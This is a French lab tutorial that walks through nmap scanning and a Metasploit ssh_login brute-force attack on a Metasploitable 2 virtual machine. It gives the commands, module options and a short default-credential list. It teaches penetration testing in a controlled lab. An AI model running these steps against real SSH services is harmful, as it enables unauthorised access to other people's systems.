### Attaque par Force Brute sur un Service SSH avec Metasploit

#### Prérequis
1. **Kali Linux** (comme machine attaquante)
2. **Metasploitable 2** (comme machine cible)
3. **VirtualBox** (ou tout autre logiciel de virtualisation)
4. **Connexion réseau** entre les machines virtuelles

### Étapes de l'attaque par force brute SSH avec Metasploit

#### Étape 1: Configuration des machines virtuelles
1. Lancez Kali Linux et Metasploitable 2 dans VirtualBox.
2. Vérifiez les adresses IP des deux machines. Dans Kali Linux, utilisez la commande suivante :
    ```bash
    ifconfig
    ```
   Notez l'adresse IP de la machine cible (Metasploitable).

#### Explication des commandes
- `ifconfig` : Affiche les informations réseau, y compris l'adresse IP de votre machine.
- `nmap -sS -sV [adresse IP de la cible]` :
  - `-sS` : Effectue un scan SYN, qui est une méthode courante pour détecter les ports ouverts.
  - `-sV` : Identifie les versions des services en cours d'exécution sur les ports ouverts.

#### Étape 2: Scanner les ports ouverts de la machine cible
1. Sur Kali Linux, effectuez un scan Nmap pour identifier les ports ouverts sur la machine cible. Par exemple, si l'adresse IP de la machine cible est `192.168.0.5` :
    ```bash
    nmap -sS -sV 192.168.0.5
    ```
   Cela vous donnera la liste des ports ouverts et des services qui y sont associés. Recherchez spécifiquement le port 22/tcp qui est utilisé par le service SSH.

- Par exemple, j'ai scanné une machine windows 10 qui est sur le même natnetwork de notre machine Kalilinux (connectés via un naatnetwork)

![image](https://github.com/hrhouma/prevention-securite-de-linformation/assets/10111526/c1b39a58-f4f9-4d6a-84f6-a0bd41ba4282)


#### Étape 3: Configuration de Metasploit
1. Ouvrez la console Metasploit :
    ```bash
    msfconsole
    ```
2. Recherchez le module `ssh_login` :
    ```bash
    search ssh_login
    ```
3. Utilisez le module `auxiliary/scanner/ssh/ssh_login` :
    ```bash
    use auxiliary/scanner/ssh/ssh_login
    ```
4. Affichez les options du module :
    ```bash
    show options
    ```

#### Étape 4: Préparation du fichier de mots de passe
1. Créez un fichier de mots de passe nommé `passwords.txt`. Par exemple :
    ```plaintext
    msfadmin msfadmin
    root toor
    user 123456
    admin admin
    ```
   Sauvegardez ce fichier dans un répertoire de votre choix sur la machine Kali Linux, par exemple `/home/user/passwords.txt`.

#### Étape 5: Configuration des options de l'attaque
1. Définissez l'adresse IP de la cible (RHOST) :
    ```bash
    set RHOST 192.168.0.5
    ```
2. Définissez le nombre de threads pour accélérer l'attaque :
    ```bash
    set THREADS 3
    ```
3. Arrêtez l'attaque après un succès :
    ```bash
    set STOP_ON_SUCCESS true
    ```
4. Activez les sorties verbales pour voir les tentatives :
    ```bash
    set VERBOSE true
    ```
5. Fournissez le fichier de mots de passe (USERPASS_FILE) :
    ```bash
    set USERPASS_FILE /home/user/passwords.txt
    ```

#### Étape 6: Lancement de l'attaque
1. Lancez l'attaque en utilisant la commande :
    ```bash
    run
    ```
   Surveillez les tentatives dans le terminal. Si l'attaque réussit, Metasploit retournera le nom d'utilisateur et le mot de passe corrects.

### Exemple de fichier de mots de passe
Voici à nouveau un exemple de fichier de mots de passe (nommé `passwords.txt`) que vous pouvez utiliser :
```plaintext
msfadmin msfadmin
root toor
user 123456
admin admin
```

### Exemple d'adresse IP de cible
- **Machine attaquante (Kali Linux)** : 192.168.0.2
- **Machine cible (Metasploitable)** : 192.168.0.5

Assurez-vous que les adresses IP correspondent à votre configuration réseau. Vous pouvez utiliser des adresses IP dans la même plage pour les machines virtuelles pour simplifier la configuration.

### Conclusion
Ce tutoriel montre comment réaliser une attaque par force brute en utilisant Metasploit sur un service SSH d'une machine Metasploitable. Utilisez ces techniques uniquement dans un environnement contrôlé et à des fins éducatives. Attaquer des systèmes sans autorisation est illégal et contraire à l'éthique.
